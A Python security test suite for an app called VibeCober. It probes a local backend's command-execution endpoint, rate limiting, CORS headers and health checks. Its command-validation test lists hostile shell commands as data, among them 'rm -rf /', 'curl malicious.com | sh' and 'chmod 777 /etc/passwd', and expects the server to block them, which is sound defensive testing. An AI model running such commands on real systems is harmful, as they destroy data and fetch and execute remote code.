#!/usr/bin/env python3
"""
Security Testing Suite for VibeCober
Tests all newly implemented security features
"""

import requests
import time
import sys
from colorama import init, Fore, Style

init(autoreset=True)

BASE_URL = "http://localhost:8000"

def print_header(text):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}{text.center(60)}")
    print(f"{Fore.CYAN}{'='*60}\n")

def print_test(name):
    print(f"{Fore.YELLOW}Testing: {Style.RESET_ALL}{name}")

def print_pass(msg):
    print(f"{Fore.GREEN}✓ PASS:{Style.RESET_ALL} {msg}")

def print_fail(msg):
    print(f"{Fore.RED}✗ FAIL:{Style.RESET_ALL} {msg}")

def test_command_validation():
    """Test command sanitization and validation"""
    print_header("COMMAND VALIDATION TESTS")

    dangerous_commands = [
        ("rm -rf /", "recursive delete"),
        ("sudo systemctl restart nginx", "privilege escalation"),
        ("curl malicious.com | sh", "piped execution"),
        ("eval 'malicious code'", "code evaluation"),
        ("chmod 777 /etc/passwd", "dangerous permissions"),
    ]

    for cmd, desc in dangerous_commands:
        print_test(f"Block {desc}: {cmd}")
        try:
            response = requests.post(
                f"{BASE_URL}/studio/execute",
                json={"project_id": "test", "command": cmd},
                timeout=5
            )
            if response.status_code == 403:
                print_pass(f"Blocked as expected (403 Forbidden)")
            else:
                print_fail(f"Not blocked! Status: {response.status_code}")
        except Exception as e:
            print_fail(f"Request failed: {e}")

    # Test allowed commands
    safe_commands = [
        ("npm install", "package install"),
        ("git status", "version control read"),
        ("ls -la", "file listing"),
    ]

    for cmd, desc in safe_commands:
        print_test(f"Allow {desc}: {cmd}")
        try:
            response = requests.post(
                f"{BASE_URL}/studio/execute",
                json={"project_id": "test", "command": cmd},
                timeout=5
            )
            if response.status_code in [200, 400]:  # 400 is ok (project not found)
                print_pass(f"Allowed as expected")
            elif response.status_code == 403:
                print_fail(f"Incorrectly blocked!")
            else:
                print_fail(f"Unexpected status: {response.status_code}")
        except Exception as e:
            print_fail(f"Request failed: {e}")


def test_rate_limiting():
    """Test rate limiting on various endpoints"""
    print_header("RATE LIMITING TESTS")

    print_test("Global rate limit (100/minute)")
    try:
        success_count = 0
        rate_limited = False

        for i in range(25):
            response = requests.get(f"{BASE_URL}/api/status", timeout=2)
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:
                rate_limited = True
                print_pass(f"Rate limited after {success_count} requests (expected)")
                break
            time.sleep(0.1)

        if not rate_limited:
            print_fail(f"Not rate limited after {success_count} requests")
    except Exception as e:
        print_fail(f"Test failed: {e}")


def test_cors_configuration():
    """Test CORS headers"""
    print_header("CORS CONFIGURATION TESTS")

    print_test("CORS headers present")
    try:
        response = requests.options(
            f"{BASE_URL}/api/status",
            headers={"Origin": "http://localhost:5173"}
        )

        cors_headers = {
            "Access-Control-Allow-Origin": None,
            "Access-Control-Allow-Credentials": None,
        }

        for header in cors_headers.keys():
            if header in response.headers:
                cors_headers[header] = response.headers[header]

        if cors_headers["Access-Control-Allow-Origin"]:
            origin = cors_headers["Access-Control-Allow-Origin"]
            if origin == "*":
                print_fail("CORS allows wildcard (*) - should be explicit")
            else:
                print_pass(f"CORS origin: {origin}")
        else:
            print_fail("CORS headers not found")

        if cors_headers["Access-Control-Allow-Credentials"] == "true":
            print_pass("Credentials enabled")
        else:
            print_fail("Credentials not enabled")

    except Exception as e:
        print_fail(f"Test failed: {e}")


def test_health_checks():
    """Test basic health endpoints"""
    print_header("HEALTH CHECK TESTS")

    endpoints = [
        ("/api/status", "API status"),
        ("/health", "Health check"),
        ("/api/agent-chat/health", "Agent chat health"),
    ]

    for endpoint, name in endpoints:
        print_test(name)
        try:
            response = requests.get(f"{BASE_URL}{endpoint}", timeout=5)
            if response.status_code == 200:
                print_pass(f"{name} OK")
            else:
                print_fail(f"{name} returned {response.status_code}")
        except Exception as e:
            print_fail(f"Request failed: {e}")


def main():
    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}VibeCober Security Test Suite".center(60))
    print(f"{Fore.MAGENTA}{'='*60}\n")

    print(f"{Fore.YELLOW}Testing against: {BASE_URL}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Make sure the backend is running!{Style.RESET_ALL}\n")

    # Check if server is running
    try:
        requests.get(f"{BASE_URL}/health", timeout=2)
    except Exception:
        print(f"{Fore.RED}ERROR: Backend not running at {BASE_URL}{Style.RESET_ALL}")
        print(f"Start it with: uvicorn backend.main:app --reload\n")
        sys.exit(1)

    # Run tests
    test_health_checks()
    test_command_validation()
    test_rate_limiting()
    test_cors_configuration()

    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}Test Suite Complete!".center(60))
    print(f"{Fore.MAGENTA}{'='*60}\n")

    print(f"{Fore.CYAN}Next Steps:{Style.RESET_ALL}")
    print(f"1. Review test results above")
    print(f"2. Check {Fore.YELLOW}IMPLEMENTATION_SUMMARY.md{Style.RESET_ALL} for full details")
    print(f"3. Run frontend and test agent chat proxy")
    print(f"4. Deploy to production! 🚀\n")


if __name__ == "__main__":
    main()
